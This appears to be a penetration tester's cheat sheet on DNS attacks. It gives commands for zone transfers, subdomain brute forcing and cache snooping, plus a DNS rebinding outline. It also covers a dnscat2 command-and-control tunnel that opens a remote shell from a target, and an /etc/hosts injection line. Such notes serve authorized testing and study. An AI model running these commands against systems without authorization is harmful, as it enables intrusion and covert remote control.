# DNS Enumeration & Attacks

**Tags:** #dns #enumeration #exploitation
**Port:** 53 (TCP/UDP)

---

## Basic Enumeration

```bash
# All record types
dig $DOMAIN ANY
dig $DOMAIN A
dig $DOMAIN MX
dig $DOMAIN NS
dig $DOMAIN TXT   # SPF, DKIM, DMARC — reveals infra
dig $DOMAIN AAAA
dig $DOMAIN CNAME
dig -x $IP        # Reverse lookup

# Specify DNS server
dig @$DC_IP $DOMAIN ANY
host -a $DOMAIN $DC_IP

# Short output
dig +short $DOMAIN A
dig +short $DOMAIN MX
```

## Zone Transfer (Critical — Often Misconfigured)

```bash
# Get nameservers first
dig $DOMAIN NS
dig @8.8.8.8 $DOMAIN NS

# Attempt zone transfer against each NS
dig @ns1.$DOMAIN $DOMAIN AXFR
dig @ns2.$DOMAIN $DOMAIN AXFR
host -l $DOMAIN ns1.$DOMAIN

# Automated
dnsrecon -d $DOMAIN -t axfr
```

## Subdomain Brute Force

```bash
# dnsrecon
dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsrecon -d $DOMAIN -t std

# gobuster
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# amass (passive + active)
amass enum -d $DOMAIN
amass enum -active -d $DOMAIN -brute

# subfinder (passive)
subfinder -d $DOMAIN

# dnsx (resolve a list)
cat subdomains.txt | dnsx -resp
```

## DNS Tunneling

```bash
# dnscat2 (DNS C2 channel)
# Server (Kali)
dnscat2-server domain.com

# Client (target)
./dnscat domain.com          # Linux
.\dnscat2.exe domain.com     # Windows

# dnscat2 commands
dnscat2> sessions
dnscat2> session -i 1
command (session 1)> listen 127.0.0.1:4455 10.10.10.5:445   # Port forward
command (session 1)> shell   # Interactive shell
```

## DNS Cache Snooping

```bash
# Check if cached (reveals visited domains)
dig @$TARGET_DNS_SERVER $DOMAIN A +norecurse
```

## DNS Rebinding Attack

```bash
# If SSRF or other server-side requests use DNS:
# 1. Register domain with TTL=0
# 2. First resolution → your IP (passes whitelist check)
# 3. Second resolution → 127.0.0.1 or internal IP
# Tools: singularity, rbndr.us
```

## Nmap DNS Scripts

```bash
nmap -p 53 --script dns-zone-transfer,dns-brute,dns-cache-snoop $TARGET
nmap -sU -p 53 --script dns-recursion $TARGET
```

## /etc/hosts Manipulation

```bash
# If you control DNS resolution on target
echo "10.10.10.5 malicious.corp.local" >> /etc/hosts

# Check current hosts file for clues
cat /etc/hosts
cat /etc/resolv.conf
```

## Related Notes

- [[01-Reconnaissance/Passive-OSINT]] — crt.sh, amass passive
- [[03-Enumeration/DNS-Enumeration]] — Detailed enumeration
